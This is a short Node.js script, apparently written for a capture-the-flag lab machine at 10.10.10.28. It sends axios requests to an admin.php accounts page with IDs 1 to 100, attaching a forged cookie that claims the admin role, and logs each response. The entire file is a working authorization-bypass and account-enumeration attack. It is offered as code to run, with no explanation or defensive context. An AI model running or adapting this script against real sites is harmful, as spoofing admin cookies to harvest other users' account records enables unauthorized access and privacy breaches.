'use strict';

const axios = require('axios');

//let sessionURL = 'http://10.10.10.28/cdn-cgi/login/admin.php';
let value = 1; 
let enumValue = 100;
let sessionURL = `http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=`

console.log('URL: ', sessionURL);

function sendRequest(sessionURL, enumValue, value){


    for(let i = 1; i <= enumValue; i++){
        let URL = sessionURL.concat(value);
        axios.get(URL, {
            headers: {
                Cookie: "user=34322; role=admin;"
            }
        }).then(response => {
            console.log('Request:', i)
            console.log('HTTP STATUS:', response.status);
            console.log(URL)
            console.log(response.data);
            
        });
        value++;
    }
};


sendRequest(sessionURL, enumValue, value);